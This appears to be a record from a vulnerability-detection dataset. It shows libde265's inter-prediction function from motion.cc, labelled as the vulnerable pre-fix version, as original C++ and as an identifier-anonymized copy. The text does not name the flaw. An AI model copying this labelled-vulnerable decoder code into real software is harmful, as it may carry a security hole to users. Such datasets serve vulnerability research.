VAR_58, VAR_59, VAR_7, VAR_8 / VAR_20, VAR_9 / VAR_21,
VAR_51, VAR_52,
VAR_65, VAR_66,
VAR_46, VAR_27);
}
}
}
else if (VAR_25[0]==1 || VAR_25[1]==1) {
int VAR_28 = VAR_25[0] ? 0 : 1;
if (VAR_15->weighted_bipred_flag==0) {
VAR_0->acceleration.put_unweighted_pred(VAR_13[0], VAR_14[0],
VAR_22[VAR_28],VAR_7, VAR_8,VAR_9, VAR_26);
VAR_0->acceleration.put_unweighted_pred(VAR_13[1], VAR_14[1],
VAR_24[0][VAR_28],VAR_7,
VAR_8/VAR_20,VAR_9/VAR_21, VAR_27);
VAR_0->acceleration.put_unweighted_pred(VAR_13[2], VAR_14[2],
VAR_24[1][VAR_28],VAR_7,
VAR_8/VAR_20,VAR_9/VAR_21, VAR_27);
}
else {
int VAR_67 = VAR_10->refIdx[VAR_28];
int VAR_45   = VAR_1->luma_log2_weight_denom + VAR_38;
int VAR_46 = VAR_1->ChromaLog2WeightDenom  + VAR_40;
int VAR_68 = VAR_1->LumaWeight[VAR_28][VAR_67];
int VAR_69 = VAR_1->luma_offset[VAR_28][VAR_67] * (1<<(VAR_39));
int VAR_70 = VAR_1->ChromaWeight[VAR_28][VAR_67][0];
int VAR_71 = VAR_1->ChromaOffset[VAR_28][VAR_67][0] * (1<<(VAR_41));
int VAR_72 = VAR_1->ChromaWeight[VAR_28][VAR_67][1];
int VAR_73 = VAR_1->ChromaOffset[VAR_28][VAR_67][1] * (1<<(VAR_41));
logtrace(VAR_32,""weighted-B-L%d [%d] %d %d %d  %dx%d\n"", VAR_28, VAR_67, VAR_45-6,VAR_68,VAR_69,VAR_8,VAR_9);
VAR_0->acceleration.put_weighted_pred(VAR_13[0], VAR_14[0],
VAR_22[VAR_28],VAR_7, VAR_8,VAR_9,
VAR_68, VAR_69, VAR_45, VAR_26);
if (VAR_2->get_chroma_format() != VAR_37) {
VAR_0->acceleration.put_weighted_pred(VAR_13[1], VAR_14[1],
VAR_24[0][VAR_28], VAR_7,
VAR_8 / VAR_20, VAR_9 / VAR_21,
VAR_70, VAR_71, VAR_46, VAR_27);
VAR_0->acceleration.put_weighted_pred(VAR_13[2], VAR_14[2],
VAR_24[1][VAR_28], VAR_7,
VAR_8 / VAR_20, VAR_9 / VAR_21,
VAR_72, VAR_73, VAR_46, VAR_27);
}
}
}
else {
VAR_0->add_warning(VAR_43, false);
VAR_2->integrity = VAR_17;
}
}
#if defined(VAR_74) && 0
logtrace(VAR_75,""MC pixels (luma), position %d %d:\n"", VAR_11,VAR_12);
for (int VAR_76=0;VAR_76<VAR_9;VAR_76++) {
logtrace(VAR_75,""MC-y-%d-%d "",VAR_11,VAR_12+VAR_76);
for (int VAR_77=0;VAR_77<VAR_8;VAR_77++) {
logtrace(VAR_75,""*%02x "", VAR_13[0][VAR_77+VAR_76*VAR_14[0]]);
}
logtrace(VAR_75,""*\n"");
}
logtrace(VAR_75,""MC pixels (chroma cb), position %d %d:\n"", VAR_11/2,VAR_12/2);
for (int VAR_76=0;VAR_76<VAR_9/2;VAR_76++) {
logtrace(VAR_75,""MC-cb-%d-%d "",VAR_11/2,VAR_12/2+VAR_76);
for (int VAR_77=0;VAR_77<VAR_8/2;VAR_77++) {
logtrace(VAR_75,""*%02x "", VAR_13[1][VAR_77+VAR_76*VAR_14[1]]);
}
logtrace(VAR_75,""*\n"");
}
logtrace(VAR_75,""MC pixels (chroma cr), position %d %d:\n"", VAR_11/2,VAR_12/2);
for (int VAR_76=0;VAR_76<VAR_9/2;VAR_76++) {
logtrace(VAR_75,""MC-cr-%d-%d "",VAR_11/2,VAR_12/2+VAR_76);
for (int VAR_77=0;VAR_77<VAR_8/2;VAR_77++) {
logtrace(VAR_75,""*%02x "", VAR_13[2][VAR_77+VAR_76*VAR_14[2]]);
}
logtrace(VAR_75,""*\n"");
}
#endif
}",strukturag/libde265/48eb7dafe204b825b4a62948ed171a0cd3f1bda2/motion.cc/vul/before/0.json,"void generate_inter_prediction_samples(base_context* ctx,
                                       const slice_segment_header* shdr,
                                       de265_image* img,
                                       int xC,int yC,
                                       int xB,int yB,
                                       int nCS, int nPbW,int nPbH,
                                       const PBMotion* vi)
{
  int xP = xC+xB;
  int yP = yC+yB;

  void*  pixels[3];
  int    stride[3];

  const pic_parameter_set* pps = shdr->pps.get();
  const seq_parameter_set* sps = pps->sps.get();

  if (sps->BitDepth_Y != img->get_bit_depth(0) ||
      sps->BitDepth_C != img->get_bit_depth(1)) {
    img->integrity = INTEGRITY_DECODING_ERRORS;
    ctx->add_warning(DE265_WARNING_BIT_DEPTH_OF_CURRENT_IMAGE_DOES_NOT_MATCH_SPS, false);
    return;
  }

  if (sps->chroma_format_idc != img->get_chroma_format()) {
    img->integrity = INTEGRITY_DECODING_ERRORS;
    ctx->add_warning(DE265_WARNING_CHROMA_OF_CURRENT_IMAGE_DOES_NOT_MATCH_SPS, false);
    return;
  }

  const int SubWidthC  = sps->SubWidthC;
  const int SubHeightC = sps->SubHeightC;

  pixels[0] = img->get_image_plane_at_pos_any_depth(0,xP,yP);
  stride[0] = img->get_image_stride(0);

  pixels[1] = img->get_image_plane_at_pos_any_depth(1,xP/SubWidthC,yP/SubHeightC);
  stride[1] = img->get_image_stride(1);

  pixels[2] = img->get_image_plane_at_pos_any_depth(2,xP/SubWidthC,yP/SubHeightC);
  stride[2] = img->get_image_stride(2);


  ALIGNED_16(int16_t) predSamplesL                 [2 /* LX */][MAX_CU_SIZE* MAX_CU_SIZE];
  ALIGNED_16(int16_t) predSamplesC[2 /* chroma */ ][2 /* LX */][MAX_CU_SIZE* MAX_CU_SIZE];

  //int xP = xC+xB;
  //int yP = yC+yB;

  int predFlag[2];
  predFlag[0] = vi->predFlag[0];
  predFlag[1] = vi->predFlag[1];

  const int bit_depth_L = sps->BitDepth_Y;
  const int bit_depth_C = sps->BitDepth_C;

  // Some encoders use bi-prediction with two similar MVs.
  // Identify this case and use only one MV.

  // do this only without weighted prediction, because the weights/offsets may be different
  if (pps->weighted_pred_flag==0) {
    if (predFlag[0] && predFlag[1]) {
      if (vi->mv[0].x == vi->mv[1].x &&
          vi->mv[0].y == vi->mv[1].y &&
          shdr->RefPicList[0][vi->refIdx[0]] ==
          shdr->RefPicList[1][vi->refIdx[1]]) {
        predFlag[1] = 0;
      }
    }
  }


  for (int l=0;l<2;l++) {
    if (predFlag[l]) {
      // 8.5.3.2.1

      if (vi->refIdx[l] >= MAX_NUM_REF_PICS) {
        img->integrity = INTEGRITY_DECODING_ERRORS;
        ctx->add_warning(DE265_WARNING_NONEXISTING_REFERENCE_PICTURE_ACCESSED, false);
        return;
      }

      const de265_image* refPic = ctx->get_image(shdr->RefPicList[l][vi->refIdx[l]]);

      logtrace(LogMotion, ""refIdx: %d -> dpb[%d]\n"", vi->refIdx[l], shdr->RefPicList[l][vi->refIdx[l]]);

      if (!refPic || refPic->PicState == UnusedForReference) {
        img->integrity = INTEGRITY_DECODING_ERRORS;
        ctx->add_warning(DE265_WARNING_NONEXISTING_REFERENCE_PICTURE_ACCESSED, false);

        // TODO: fill predSamplesC with black or grey
      }
      else if (refPic->get_width(0) != sps->pic_width_in_luma_samples ||
               refPic->get_height(0) != sps->pic_height_in_luma_samples ||
               img->get_chroma_format() != refPic->get_chroma_format()) {
        img->integrity = INTEGRITY_DECODING_ERRORS;
        ctx->add_warning(DE265_WARNING_REFERENCE_IMAGE_SIZE_DOES_NOT_MATCH_SPS, false);
      }
      else if (img->get_bit_depth(0) != refPic->get_bit_depth(0) ||
               img->get_bit_depth(1) != refPic->get_bit_depth(1)) {
        img->integrity = INTEGRITY_DECODING_ERRORS;
        ctx->add_warning(DE265_WARNING_REFERENCE_IMAGE_BIT_DEPTH_DOES_NOT_MATCH, false);
      }
      else if (img->get_chroma_format() != refPic->get_chroma_format()) {
        img->integrity = INTEGRITY_DECODING_ERRORS;
        ctx->add_warning(DE265_WARNING_REFERENCE_IMAGE_CHROMA_FORMAT_DOES_NOT_MATCH, false);
      }
      else {
        // 8.5.3.2.2

        logtrace(LogMotion,""do MC: L%d,MV=%d;%d RefPOC=%d\n"",
                 l,vi->mv[l].x,vi->mv[l].y,refPic->PicOrderCntVal);


        // TODO: must predSamples stride really be nCS or can it be somthing smaller like nPbW?

        if (img->high_bit_depth(0)) {
          mc_luma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP,yP,
                  predSamplesL[l],nCS,
                  (const uint16_t*)refPic->get_image_plane(0),
                  refPic->get_luma_stride(), nPbW,nPbH, bit_depth_L);
        }
        else {
          mc_luma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP,yP,
                  predSamplesL[l],nCS,
                  (const uint8_t*)refPic->get_image_plane(0),
                  refPic->get_luma_stride(), nPbW,nPbH, bit_depth_L);
        }

        if (img->get_chroma_format() != de265_chroma_mono) {
          if (img->high_bit_depth(1)) {
            mc_chroma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP, yP,
                      predSamplesC[0][l], nCS, (const uint16_t*) refPic->get_image_plane(1),
                      refPic->get_chroma_stride(), nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
            mc_chroma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP, yP,
                      predSamplesC[1][l], nCS, (const uint16_t*) refPic->get_image_plane(2),
                      refPic->get_chroma_stride(), nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
          }
          else {
            mc_chroma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP, yP,
                      predSamplesC[0][l], nCS, (const uint8_t*) refPic->get_image_plane(1),
                      refPic->get_chroma_stride(), nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
            mc_chroma(ctx, sps, vi->mv[l].x, vi->mv[l].y, xP, yP,
                      predSamplesC[1][l], nCS, (const uint8_t*) refPic->get_image_plane(2),
                      refPic->get_chroma_stride(), nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
          }
        }
      }
    }
  }


  // weighted sample prediction  (8.5.3.2.3)

  const int shift1_L = libde265_max(2,14-sps->BitDepth_Y);
  const int offset_shift1_L = img->get_sps().WpOffsetBdShiftY;
  const int shift1_C = libde265_max(2,14-sps->BitDepth_C);
  const int offset_shift1_C = img->get_sps().WpOffsetBdShiftC;

  /*
  const int shift1_L = 14-img->sps.BitDepth_Y;
  const int offset_shift1_L = img->sps.BitDepth_Y-8;
  const int shift1_C = 14-img->sps.BitDepth_C;
  const int offset_shift1_C = img->sps.BitDepth_C-8;
  */

  /*
  if (0)
  printf(""%d/%d %d/%d %d/%d %d/%d\n"",
         shift1_L,
         Nshift1_L,
         offset_shift1_L,
         Noffset_shift1_L,
         shift1_C,
         Nshift1_C,
         offset_shift1_C,
         Noffset_shift1_C);

  assert(shift1_L==
         Nshift1_L);
  assert(offset_shift1_L==
         Noffset_shift1_L);
  assert(shift1_C==
         Nshift1_C);
  assert(offset_shift1_C==
         Noffset_shift1_C);
  */


  logtrace(LogMotion,""predFlags (modified): %d %d\n"", predFlag[0], predFlag[1]);

  if (shdr->slice_type == SLICE_TYPE_P) {
    if (pps->weighted_pred_flag==0) {
      if (predFlag[0]==1 && predFlag[1]==0) {
        ctx->acceleration.put_unweighted_pred(pixels[0], stride[0],
                                              predSamplesL[0],nCS, nPbW,nPbH, bit_depth_L);

        if (img->get_chroma_format() != de265_chroma_mono) {
          ctx->acceleration.put_unweighted_pred(pixels[1], stride[1],
                                                predSamplesC[0][0], nCS,
                                                nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
          ctx->acceleration.put_unweighted_pred(pixels[2], stride[2],
                                                predSamplesC[1][0], nCS,
                                                nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
        }
      }
      else {
        ctx->add_warning(DE265_WARNING_BOTH_PREDFLAGS_ZERO, false);
        img->integrity = INTEGRITY_DECODING_ERRORS;
      }
    }
    else {
      // weighted prediction

      if (predFlag[0]==1 && predFlag[1]==0) {

        int refIdx0 = vi->refIdx[0];

        int luma_log2WD   = shdr->luma_log2_weight_denom + shift1_L;
        int chroma_log2WD = shdr->ChromaLog2WeightDenom  + shift1_C;

        int luma_w0 = shdr->LumaWeight[0][refIdx0];
        int luma_o0 = shdr->luma_offset[0][refIdx0] * (1<<(offset_shift1_L));

        int chroma0_w0 = shdr->ChromaWeight[0][refIdx0][0];
        int chroma0_o0 = shdr->ChromaOffset[0][refIdx0][0] * (1<<(offset_shift1_C));
        int chroma1_w0 = shdr->ChromaWeight[0][refIdx0][1];
        int chroma1_o0 = shdr->ChromaOffset[0][refIdx0][1] * (1<<(offset_shift1_C));

        logtrace(LogMotion,""weighted-0 [%d] %d %d %d  %dx%d\n"", refIdx0, luma_log2WD-6,luma_w0,luma_o0,nPbW,nPbH);

        ctx->acceleration.put_weighted_pred(pixels[0], stride[0],
                                            predSamplesL[0],nCS, nPbW,nPbH,
                                            luma_w0, luma_o0, luma_log2WD, bit_depth_L);
        if (img->get_chroma_format() != de265_chroma_mono) {
          ctx->acceleration.put_weighted_pred(pixels[1], stride[1],
                                              predSamplesC[0][0], nCS, nPbW / SubWidthC, nPbH / SubHeightC,
                                              chroma0_w0, chroma0_o0, chroma_log2WD, bit_depth_C);
          ctx->acceleration.put_weighted_pred(pixels[2], stride[2],
                                              predSamplesC[1][0], nCS, nPbW / SubWidthC, nPbH / SubHeightC,
                                              chroma1_w0, chroma1_o0, chroma_log2WD, bit_depth_C);
        }
      }
      else {
        ctx->add_warning(DE265_WARNING_BOTH_PREDFLAGS_ZERO, false);
        img->integrity = INTEGRITY_DECODING_ERRORS;
      }
    }
  }
  else {
    assert(shdr->slice_type == SLICE_TYPE_B);

    if (predFlag[0]==1 && predFlag[1]==1) {
      if (pps->weighted_bipred_flag==0) {
        //const int shift2  = 15-8; // TODO: real bit depth
        //const int offset2 = 1<<(shift2-1);

        int16_t* in0 = predSamplesL[0];
        int16_t* in1 = predSamplesL[1];

        ctx->acceleration.put_weighted_pred_avg(pixels[0], stride[0],
                                                in0,in1, nCS, nPbW, nPbH, bit_depth_L);

        int16_t* in00 = predSamplesC[0][0];
        int16_t* in01 = predSamplesC[0][1];
        int16_t* in10 = predSamplesC[1][0];
        int16_t* in11 = predSamplesC[1][1];

        ctx->acceleration.put_weighted_pred_avg(pixels[1], stride[1],
                                                in00,in01, nCS,
                                                nPbW/SubWidthC, nPbH/SubHeightC, bit_depth_C);
        ctx->acceleration.put_weighted_pred_avg(pixels[2], stride[2],
                                                in10,in11, nCS,
                                                nPbW/SubWidthC, nPbH/SubHeightC, bit_depth_C);
      }
      else {
        // weighted prediction

        int refIdx0 = vi->refIdx[0];
        int refIdx1 = vi->refIdx[1];

        int luma_log2WD   = shdr->luma_log2_weight_denom + shift1_L;
        int chroma_log2WD = shdr->ChromaLog2WeightDenom + shift1_C;

        int luma_w0 = shdr->LumaWeight[0][refIdx0];
        int luma_o0 = shdr->luma_offset[0][refIdx0] * (1<<(offset_shift1_L));
        int luma_w1 = shdr->LumaWeight[1][refIdx1];
        int luma_o1 = shdr->luma_offset[1][refIdx1] * (1<<(offset_shift1_L));

        int chroma0_w0 = shdr->ChromaWeight[0][refIdx0][0];
        int chroma0_o0 = shdr->ChromaOffset[0][refIdx0][0] * (1<<(offset_shift1_C));
        int chroma1_w0 = shdr->ChromaWeight[0][refIdx0][1];
        int chroma1_o0 = shdr->ChromaOffset[0][refIdx0][1] * (1<<(offset_shift1_C));
        int chroma0_w1 = shdr->ChromaWeight[1][refIdx1][0];
        int chroma0_o1 = shdr->ChromaOffset[1][refIdx1][0] * (1<<(offset_shift1_C));
        int chroma1_w1 = shdr->ChromaWeight[1][refIdx1][1];
        int chroma1_o1 = shdr->ChromaOffset[1][refIdx1][1] * (1<<(offset_shift1_C));

        logtrace(LogMotion,""weighted-BI-0 [%d] %d %d %d  %dx%d\n"", refIdx0, luma_log2WD-6,luma_w0,luma_o0,nPbW,nPbH);
        logtrace(LogMotion,""weighted-BI-1 [%d] %d %d %d  %dx%d\n"", refIdx1, luma_log2WD-6,luma_w1,luma_o1,nPbW,nPbH);

        int16_t* in0 = predSamplesL[0];
        int16_t* in1 = predSamplesL[1];

        ctx->acceleration.put_weighted_bipred(pixels[0], stride[0],
                                              in0,in1, nCS, nPbW, nPbH,
                                              luma_w0,luma_o0,
                                              luma_w1,luma_o1,
                                              luma_log2WD, bit_depth_L);

        int16_t* in00 = predSamplesC[0][0];
        int16_t* in01 = predSamplesC[0][1];
        int16_t* in10 = predSamplesC[1][0];
        int16_t* in11 = predSamplesC[1][1];

        if (img->get_chroma_format() != de265_chroma_mono) {
          ctx->acceleration.put_weighted_bipred(pixels[1], stride[1],
                                                in00, in01, nCS, nPbW / SubWidthC, nPbH / SubHeightC,
                                                chroma0_w0, chroma0_o0,
                                                chroma0_w1, chroma0_o1,
                                                chroma_log2WD, bit_depth_C);
          ctx->acceleration.put_weighted_bipred(pixels[2], stride[2],
                                                in10, in11, nCS, nPbW / SubWidthC, nPbH / SubHeightC,
                                                chroma1_w0, chroma1_o0,
                                                chroma1_w1, chroma1_o1,
                                                chroma_log2WD, bit_depth_C);
        }
      }
    }
    else if (predFlag[0]==1 || predFlag[1]==1) {
      int l = predFlag[0] ? 0 : 1;

      if (pps->weighted_bipred_flag==0) {
        ctx->acceleration.put_unweighted_pred(pixels[0], stride[0],
                                              predSamplesL[l],nCS, nPbW,nPbH, bit_depth_L);

        if (img->get_chroma_format() != de265_chroma_mono) {
          ctx->acceleration.put_unweighted_pred(pixels[1], stride[1],
                                                predSamplesC[0][l], nCS,
                                                nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
          ctx->acceleration.put_unweighted_pred(pixels[2], stride[2],
                                                predSamplesC[1][l], nCS,
                                                nPbW / SubWidthC, nPbH / SubHeightC, bit_depth_C);
        }
      }
      else {
        int refIdx = vi->refIdx[l];

        int luma_log2WD   = shdr->luma_log2_weight_denom + shift1_L;
        int chroma_log2WD = shdr->ChromaLog2WeightDenom  + shift1_C;

        int luma_w = shdr->LumaWeight[l][refIdx];
        int luma_o = shdr->luma_offset[l][refIdx] * (1<<(offset_shift1_L));

        int chroma0_w = shdr->ChromaWeight[l][refIdx][0];
        int chroma0_o = shdr->ChromaOffset[l][refIdx][0] * (1<<(offset_shift1_C));
        int chroma1_w = shdr->ChromaWeight[l][refIdx][1];
        int chroma1_o = shdr->ChromaOffset[l][refIdx][1] * (1<<(offset_shift1_C));

        logtrace(LogMotion,""weighted-B-L%d [%d] %d %d %d  %dx%d\n"", l, refIdx, luma_log2WD-6,luma_w,luma_o,nPbW,nPbH);

        ctx->acceleration.put_weighted_pred(pixels[0], stride[0],
                                            predSamplesL[l],nCS, nPbW,nPbH,
                                            luma_w, luma_o, luma_log2WD, bit_depth_L);

        if (img->get_chroma_format() != de265_chroma_mono) {
          ctx->acceleration.put_weighted_pred(pixels[1], stride[1],
                                              predSamplesC[0][l], nCS,
                                              nPbW / SubWidthC, nPbH / SubHeightC,
                                              chroma0_w, chroma0_o, chroma_log2WD, bit_depth_C);
          ctx->acceleration.put_weighted_pred(pixels[2], stride[2],
                                              predSamplesC[1][l], nCS,
                                              nPbW / SubWidthC, nPbH / SubHeightC,
                                              chroma1_w, chroma1_o, chroma_log2WD, bit_depth_C);
        }
      }
    }
    else {
      // TODO: check why it can actually happen that both predFlags[] are false.
      // For now, we ignore this and continue decoding.

      ctx->add_warning(DE265_WARNING_BOTH_PREDFLAGS_ZERO, false);
      img->integrity = INTEGRITY_DECODING_ERRORS;
    }
  }

#if defined(DE265_LOG_TRACE) && 0
  logtrace(LogTransform,""MC pixels (luma), position %d %d:\n"", xP,yP);

  for (int y=0;y<nPbH;y++) {
    logtrace(LogTransform,""MC-y-%d-%d "",xP,yP+y);

    for (int x=0;x<nPbW;x++) {
      logtrace(LogTransform,""*%02x "", pixels[0][x+y*stride[0]]);
    }

    logtrace(LogTransform,""*\n"");
  }


  logtrace(LogTransform,""MC pixels (chroma cb), position %d %d:\n"", xP/2,yP/2);

  for (int y=0;y<nPbH/2;y++) {
    logtrace(LogTransform,""MC-cb-%d-%d "",xP/2,yP/2+y);

    for (int x=0;x<nPbW/2;x++) {
      logtrace(LogTransform,""*%02x "", pixels[1][x+y*stride[1]]);
    }

    logtrace(LogTransform,""*\n"");
  }


  logtrace(LogTransform,""MC pixels (chroma cr), position %d %d:\n"", xP/2,yP/2);

  for (int y=0;y<nPbH/2;y++) {
    logtrace(LogTransform,""MC-cr-%d-%d "",xP/2,yP/2+y);

    for (int x=0;x<nPbW/2;x++) {
      logtrace(LogTransform,""*%02x "", pixels[2][x+y*stride[2]]);
    }

    logtrace(LogTransform,""*\n"");
  }
#endif
}","void generate_inter_prediction_samples(base_context* VAR_0,
                                       const slice_segment_header* VAR_1,
                                       de265_image* VAR_2,
                                       int VAR_3,int VAR_4,
                                       int VAR_5,int VAR_6,
                                       int VAR_7, int VAR_8,int VAR_9,
                                       const PBMotion* VAR_10)
{
  int VAR_11 = VAR_3+VAR_5;
  int VAR_12 = VAR_4+VAR_6;

  void*  VAR_13[3];
  int    VAR_14[3];

  const pic_parameter_set* VAR_15 = VAR_1->pps.get();
  const seq_parameter_set* VAR_16 = VAR_15->sps.get();

  if (VAR_16->BitDepth_Y != VAR_2->get_bit_depth(0) ||
      VAR_16->BitDepth_C != VAR_2->get_bit_depth(1)) {
    VAR_2->integrity = VAR_17;
    VAR_0->add_warning(VAR_18, false);
    return;
  }

  if (VAR_16->chroma_format_idc != VAR_2->get_chroma_format()) {
    VAR_2->integrity = VAR_17;
    VAR_0->add_warning(VAR_19, false);
    return;
  }

  const int VAR_20  = VAR_16->SubWidthC;
  const int VAR_21 = VAR_16->SubHeightC;

  VAR_13[0] = VAR_2->get_image_plane_at_pos_any_depth(0,VAR_11,VAR_12);
  VAR_14[0] = VAR_2->get_image_stride(0);

  VAR_13[1] = VAR_2->get_image_plane_at_pos_any_depth(1,VAR_11/VAR_20,VAR_12/VAR_21);
  VAR_14[1] = VAR_2->get_image_stride(1);

  VAR_13[2] = VAR_2->get_image_plane_at_pos_any_depth(2,VAR_11/VAR_20,VAR_12/VAR_21);
  VAR_14[2] = VAR_2->get_image_stride(2);


  ALIGNED_16(int16_t) VAR_22                 [2 /* COMMENT_0 */][VAR_23* VAR_23];
  ALIGNED_16(int16_t) VAR_24[2 /* COMMENT_1 */ ][2 /* COMMENT_0 */][VAR_23* VAR_23];

  /* COMMENT_2 */
  /* COMMENT_3 */

  int VAR_25[2];
  VAR_25[0] = VAR_10->predFlag[0];
  VAR_25[1] = VAR_10->predFlag[1];

  const int VAR_26 = VAR_16->BitDepth_Y;
  const int VAR_27 = VAR_16->BitDepth_C;

  /* COMMENT_4 */
  /* COMMENT_5 */

  /* COMMENT_6 */
  if (VAR_15->weighted_pred_flag==0) {
    if (VAR_25[0] && VAR_25[1]) {
      if (VAR_10->mv[0].x == VAR_10->mv[1].x &&
          VAR_10->mv[0].y == VAR_10->mv[1].y &&
          VAR_1->RefPicList[0][VAR_10->refIdx[0]] ==
          VAR_1->RefPicList[1][VAR_10->refIdx[1]]) {
        VAR_25[1] = 0;
      }
    }
  }


  for (int VAR_28=0;VAR_28<2;VAR_28++) {
    if (VAR_25[VAR_28]) {
      /* COMMENT_7 */

      if (VAR_10->refIdx[VAR_28] >= VAR_29) {
        VAR_2->integrity = VAR_17;
        VAR_0->add_warning(VAR_30, false);
        return;
      }

      const de265_image* VAR_31 = VAR_0->get_image(VAR_1->RefPicList[VAR_28][VAR_10->refIdx[VAR_28]]);

      logtrace(VAR_32, ""refIdx: %d -> dpb[%d]\n"", VAR_10->refIdx[VAR_28], VAR_1->RefPicList[VAR_28][VAR_10->refIdx[VAR_28]]);

      if (!VAR_31 || VAR_31->PicState == VAR_33) {
        VAR_2->integrity = VAR_17;
        VAR_0->add_warning(VAR_30, false);

        /* COMMENT_8 */
      }
      else if (VAR_31->get_width(0) != VAR_16->pic_width_in_luma_samples ||
               VAR_31->get_height(0) != VAR_16->pic_height_in_luma_samples ||
               VAR_2->get_chroma_format() != VAR_31->get_chroma_format()) {
        VAR_2->integrity = VAR_17;
        VAR_0->add_warning(VAR_34, false);
      }
      else if (VAR_2->get_bit_depth(0) != VAR_31->get_bit_depth(0) ||
               VAR_2->get_bit_depth(1) != VAR_31->get_bit_depth(1)) {
        VAR_2->integrity = VAR_17;
        VAR_0->add_warning(VAR_35, false);
      }
      else if (VAR_2->get_chroma_format() != VAR_31->get_chroma_format()) {
        VAR_2->integrity = VAR_17;
        VAR_0->add_warning(VAR_36, false);
      }
      else {
        /* COMMENT_9 */

        logtrace(VAR_32,""do MC: L%d,MV=%d;%d RefPOC=%d\n"",
                 VAR_28,VAR_10->mv[VAR_28].x,VAR_10->mv[VAR_28].y,VAR_31->PicOrderCntVal);


        /* COMMENT_10 */

        if (VAR_2->high_bit_depth(0)) {
          mc_luma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11,VAR_12,
                  VAR_22[VAR_28],VAR_7,
                  (const uint16_t*)VAR_31->get_image_plane(0),
                  VAR_31->get_luma_stride(), VAR_8,VAR_9, VAR_26);
        }
        else {
          mc_luma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11,VAR_12,
                  VAR_22[VAR_28],VAR_7,
                  (const uint8_t*)VAR_31->get_image_plane(0),
                  VAR_31->get_luma_stride(), VAR_8,VAR_9, VAR_26);
        }

        if (VAR_2->get_chroma_format() != VAR_37) {
          if (VAR_2->high_bit_depth(1)) {
            mc_chroma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11, VAR_12,
                      VAR_24[0][VAR_28], VAR_7, (const uint16_t*) VAR_31->get_image_plane(1),
                      VAR_31->get_chroma_stride(), VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
            mc_chroma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11, VAR_12,
                      VAR_24[1][VAR_28], VAR_7, (const uint16_t*) VAR_31->get_image_plane(2),
                      VAR_31->get_chroma_stride(), VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
          }
          else {
            mc_chroma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11, VAR_12,
                      VAR_24[0][VAR_28], VAR_7, (const uint8_t*) VAR_31->get_image_plane(1),
                      VAR_31->get_chroma_stride(), VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
            mc_chroma(VAR_0, VAR_16, VAR_10->mv[VAR_28].x, VAR_10->mv[VAR_28].y, VAR_11, VAR_12,
                      VAR_24[1][VAR_28], VAR_7, (const uint8_t*) VAR_31->get_image_plane(2),
                      VAR_31->get_chroma_stride(), VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
          }
        }
      }
    }
  }


  /* COMMENT_11 */

  const int VAR_38 = libde265_max(2,14-VAR_16->BitDepth_Y);
  const int VAR_39 = VAR_2->get_sps().WpOffsetBdShiftY;
  const int VAR_40 = libde265_max(2,14-VAR_16->BitDepth_C);
  const int VAR_41 = VAR_2->get_sps().WpOffsetBdShiftC;

  /* COMMENT_12 */
                                              
                                                    
                                              
                                                    
    

  /* COMMENT_18 */
        
                                     
                  
                   
                         
                          
                  
                   
                         
                           

                   
                    
                          
                           
                   
                    
                          
                           
    


  logtrace(VAR_32,""predFlags (modified): %d %d\n"", VAR_25[0], VAR_25[1]);

  if (VAR_1->slice_type == VAR_42) {
    if (VAR_15->weighted_pred_flag==0) {
      if (VAR_25[0]==1 && VAR_25[1]==0) {
        VAR_0->acceleration.put_unweighted_pred(VAR_13[0], VAR_14[0],
                                              VAR_22[0],VAR_7, VAR_8,VAR_9, VAR_26);

        if (VAR_2->get_chroma_format() != VAR_37) {
          VAR_0->acceleration.put_unweighted_pred(VAR_13[1], VAR_14[1],
                                                VAR_24[0][0], VAR_7,
                                                VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
          VAR_0->acceleration.put_unweighted_pred(VAR_13[2], VAR_14[2],
                                                VAR_24[1][0], VAR_7,
                                                VAR_8 / VAR_20, VAR_9 / VAR_21, VAR_27);
        }
      }
      else {
        VAR_0->add_warning(VAR_43, false);
        VAR_2->integrity = VAR_17;
      }
    }
    else {
      /* COMMENT_38 */

      if (VAR_25[0]==1 && VAR_25[1]==0) {

        int VAR_44 = VAR_10->refIdx[0];

        int VAR_45   = VAR_1->luma_log2_weight_denom + VAR_38;
        int VAR_46 = VAR_1->ChromaLog2WeightDenom  + VAR_40;

        int VAR_47 = VAR_1->LumaWeight[0][VAR_44];
        int VAR_48 = VAR_1->luma_offset[0][VAR_44] * (1<<(VAR_39));

        int VAR_49 = VAR_1->ChromaWeight[0][VAR_44][0];
        int VAR_50 = VAR_1->ChromaOffset[0][VAR_44][0] * (1<<(VAR_41));
        int VAR_51 = VAR_1->ChromaWeight[0][VAR_44][1];
        int VAR_52 = VAR_1->ChromaOffset[0][VAR_44][1] * (1<<(VAR_41));

        logtrace(VAR_32,""weighted-0 [%d] %d %d %d  %dx%d\n"", VAR_44, VAR_45-6,VAR_47,VAR_48,VAR_8,VAR_9);

        VAR_0->acceleration.put_weighted_pred(VAR_13[0], VAR_14[0],
                                            VAR_22[0],VAR_7, VAR_8,VAR_9,
                                            VAR_47, VAR_48, VAR_45, VAR_26);
        if (VAR_2->get_chroma_format() != VAR_37) {
          VAR_0->acceleration.put_weighted_pred(VAR_13[1], VAR_14[1],
                                              VAR_24[0][0], VAR_7, VAR_8 / VAR_20, VAR_9 / VAR_21,
